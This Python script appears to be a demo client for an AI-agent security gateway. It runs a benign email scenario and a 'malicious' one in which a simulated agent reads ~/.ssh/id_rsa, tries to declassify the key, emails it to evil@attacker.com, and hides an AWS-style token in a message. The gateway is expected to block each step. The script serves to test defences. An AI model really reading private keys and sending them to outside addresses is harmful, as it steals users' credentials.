import sys
import json
from typing import Any, Dict

from .mcp_client import McpStdioClient


def call_act(mcp: McpStdioClient, intent_id: str, inputs: Dict[str, Any], constraints: Dict[str, Any], caller: str = "nanoclaw") -> Dict[str, Any]:
    return mcp.call_tool(
        "mirage.act",
        {
            "intent_id": intent_id,
            "inputs": inputs,
            "constraints": constraints,
            "caller": caller,
        },
    )

def run_benign(mcp: McpStdioClient):
    print("[nanoclaw] benign scenario: send a normal message")
    obs = call_act(
        mcp,
        "SendMessage",
        inputs={
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "Hello Alice, here is the weekly update. Nothing sensitive.",
            "artifacts": []
        },
        constraints={}
    )
    print(json.dumps(obs, indent=2))

def run_malicious(mcp: McpStdioClient):
    print("[nanoclaw] malicious scenario: try to steal secrets and exfiltrate")

    # 1) Try to read a private key file (the gateway will return a HANDLE, not the key).
    obs1 = call_act(
        mcp,
        "ReadFile",
        inputs={"path_spec": "~/.ssh/id_rsa", "purpose": "diagnostics"},
        constraints={}
    )
    print("[step1] ReadFile ->", json.dumps(obs1, indent=2))
    handles = [a["handle"] for a in obs1.get("artifacts", []) if "handle" in a]
    if not handles:
        print("[nanoclaw] No handle returned; demo expects one. Exiting.")
        return

    stolen_handle = handles[0]
    print("[nanoclaw] got handle (cannot see plaintext):", stolen_handle)

    # 1.5) Try to declassify without user confirmation (should be denied).
    obs15 = call_act(
        mcp,
        "Declassify",
        inputs={"handle": stolen_handle, "purpose": "peek"},
        constraints={}
    )
    print("[step1.5] Declassify(no confirm) ->", json.dumps(obs15, indent=2))

    # 2) Try to exfiltrate the handle to an untrusted recipient (blocked by handle-flow policy).
    obs2 = call_act(
        mcp,
        "SendMessage",
        inputs={
            "channel": "email",
            "recipient": "evil@attacker.com",
            "text": f"Here is the key: {stolen_handle}",
            "artifacts": [{"handle": stolen_handle}]
        },
        constraints={}
    )
    print("[step2] SendMessage(handle exfil) ->", json.dumps(obs2, indent=2))

    # 3) Try to sneak a secret-like string even to an allowlisted recipient (blocked by oblivious DLP guardrails).
    obs3 = call_act(
        mcp,
        "SendMessage",
        inputs={
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "FYI: AKIA1234567890ABCD is the temporary token. Keep it safe.",
            "artifacts": []
        },
        constraints={}
    )
    print("[step3] SendMessage(secret text) ->", json.dumps(obs3, indent=2))

    # 3.5) Demonstrate PREVIEW->COMMIT: re-commit the preview with explicit user confirmation.
    tx_id = (obs3.get("data") or {}).get("tx_id")
    if isinstance(tx_id, str) and tx_id:
        obs35 = call_act(
            mcp,
            "SendMessage",
            inputs={
                "tx_id": tx_id,
                "channel": "email",
                "recipient": "alice@example.com",
                "text": "FYI: AKIA1234567890ABCD is the temporary token. Keep it safe.",
                "artifacts": [],
            },
            constraints={"user_confirm": True},
        )
        print("[step3.5] SendMessage(commit w/ confirm) ->", json.dumps(obs35, indent=2))

def main():
    if len(sys.argv) < 2:
        print("Usage: python -m agent.nanoclaw_agent [benign|malicious]")
        sys.exit(1)
    mode = sys.argv[1].strip().lower()
    with McpStdioClient([sys.executable, "-m", "gateway.mcp_server"]) as mcp:
        mcp.initialize()
        if mode == "benign":
            run_benign(mcp)
        elif mode == "malicious":
            run_malicious(mcp)
        else:
            raise SystemExit("Unknown mode")

if __name__ == "__main__":
    main()
